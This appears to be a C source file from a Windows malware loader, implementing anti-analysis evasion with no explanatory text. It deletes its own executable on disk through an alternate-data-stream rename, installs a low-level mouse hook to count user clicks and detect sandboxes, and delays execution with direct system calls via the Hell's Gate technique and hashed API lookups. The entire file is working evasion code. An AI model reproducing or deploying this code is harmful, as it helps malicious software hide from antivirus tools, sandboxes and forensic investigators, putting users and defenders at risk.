#include <Windows.h>
#include "Common.h"
#include "Debug.h"
#include "Structs.h"

extern VX_TABLE		g_Sys;
extern API_HASHING	g_Api;

HHOOK g_hMouseHook = NULL;
DWORD dwMouseClicks		= NULL;

LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {
	
	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN)
		dwMouseClicks++;

	return g_Api.pCallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

	MSG			Msg			= { 0 };

	g_hMouseHook = g_Api.pSetWindowsHookExW(
		WH_MOUSE_LL,
		(HOOKPROC)HookEvent,
		NULL,
		NULL
	);

	while (g_Api.pGetMessageW(&Msg, NULL, NULL, NULL)) {
		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
	}

	return TRUE;
}

BOOL DeleteSelf() {


	WCHAR				    szPath[MAX_PATH * 2]	= { 0 };
	FILE_DISPOSITION_INFO	Delete					= { 0 };
	HANDLE				    hFile					= INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename					= NULL;
	const wchar_t*			NewStream				= (const wchar_t*)NEW_STREAM;
	SIZE_T				    sRename					= sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
#ifdef DEBUG
		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));
	
	Delete.DeleteFileW = TRUE;

	pRename->FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
#ifdef DEBUG
		PRINTA("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
	
	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	g_Api.pCloseHandle(hFile);

	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW[2] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle[2] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	g_Api.pCloseHandle(hFile);

	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}


BOOL DelayExecution(FLOAT ftMinutes) {

	DWORD						dwMilliSeconds					= ftMinutes * 60000;
	LARGE_INTEGER				DelayInterval					= { 0 };
	LONGLONG					Delay							= NULL;
	NTSTATUS					STATUS							= NULL;
	DWORD						_T0								= NULL;
	DWORD						_T1								= NULL;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = g_Api.pGetTickCount64();

	HellsGate(g_Sys.NtDelayExecution.wSystemCall);
	if ((STATUS = HellDescent(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
		PRINTA("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	_T1 = g_Api.pGetTickCount64();

	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

	return TRUE;
} 

BOOL AntiAnalysis(DWORD dwMilliSeconds) {

	HANDLE				hThread				= NULL;
	NTSTATUS			STATUS				= NULL;
	LARGE_INTEGER		DelayInterval		= { 0 };
	FLOAT				i					= 1;
	LONGLONG			Delay				= NULL;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;
	
	if (!DeleteSelf()) {
#ifdef DEBUG
		PRINTA("[!] Self-Deletion Failed \n");
#endif
	}

	while (i <= 15) {

		HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
		if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

		HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
		if ((STATUS = HellDescent(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
			PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

		HellsGate(g_Sys.NtClose.wSystemCall);
		if ((STATUS = HellDescent(hThread)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

		if (g_hMouseHook && !g_Api.pUnhookWindowsHookEx(g_hMouseHook)) {
#ifdef DEBUG
			PRINTA("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
#endif
			return FALSE;
		}

		if (!DelayExecution((FLOAT)(i / 2)))
			return FALSE;

		if (dwMouseClicks > 5)
			return TRUE;

		dwMouseClicks = NULL;

		i++;
	}

	return FALSE;
}
